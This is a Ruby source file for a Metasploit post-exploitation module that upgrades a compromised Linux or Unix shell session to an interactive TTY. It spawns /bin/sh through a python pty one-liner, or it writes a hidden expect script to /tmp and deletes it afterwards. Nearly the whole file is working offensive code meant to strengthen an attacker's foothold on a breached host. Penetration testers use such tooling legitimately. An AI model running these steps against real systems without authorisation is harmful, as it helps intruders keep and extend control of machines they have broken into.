
class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multiple Linux / Unix Post TTY Shell',
        'Description'   => %q{
          This module attempts to acquire a TTY via python or expect.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
        'Platform'      => [ 'linux','unix','osx','solaris','aix','bsd' ],
        'References'    =>
          [
            [ 'URL', 'http://pentestmonkey.net/blog/post-exploitation-without-a-tty']
          ],
        'SessionTypes'  => [ 'shell' ]
      ))

      register_options([
        OptBool.new('USE_EXPECT', [true, 'Try expect shell', false]),
        OptBool.new('USE_PYTHON', [true, 'Try python shell', true]),
        OptString.new('TTY_SHELL', [true, 'Shell to spawn in TTY', '/bin/sh'])
      ], self.class)

  end

  def run
    # Error checking the results of a TTY shell attempt is tricky.
    # After the TTY is acquired, cmd_exec no longer work until the next run
    if have_tty?
      print_good("Already have TTY")
      return
    end
    if check_expect?
      # This drops a file to disk, but works more often intesting
      vprint_good("Using expect method")
      expect_tty
    elsif check_python?
      # First choice since it's in-memory
      vprint_good("Using Python method")
      # Given that the python binary keeps running we get no output.
      cmd_exec("python -c \"import pty;pty.spawn('#{datastore['TTY_SHELL']}')\"", nil, 2)
      cmd_exec("\n")
    else
      print_error("No suitable TTY shell methods were found")
      return
    end
  end

  def exploit_simple(opts={})
    run
  end

  # Needs testing on more platforms.
  def have_tty?
    return cmd_exec("tty").empty?
  end

  def check_python?
    if  datastore['USE_PYTHON'] and
      !cmd_exec("which python").empty? and
      cmd_exec("python -c \"import pty; print 'HAVE_PTY'\"") == 'HAVE_PTY'
      return true
    else
      return false
    end
  end

  def check_expect?
    datastore['USE_EXPECT'] and !cmd_exec("which expect").empty?
  end

  def expect_tty
    expect_sh = "/tmp/." + Rex::Text.rand_text_alpha(7)
    begin
      # Based on the sudo post module's askpass_sudo method
      # Expect shell from pentestmonkey, with self cleanup addition
      vprint_status "Writing the expect script: #{expect_sh}"
      data = <<EOS
#!/usr/bin/expect
spawn rm #{expect_sh}
spawn /bin/sh
interact
EOS
      write_file(expect_sh, data)
      cmd_exec("expect #{expect_sh}",nil,1)
    rescue
      print_error "Unable to get expect TTY shell"
    ensure
      cmd_exec("rm #{expect_sh}", nil, 1)
    end
  end


end
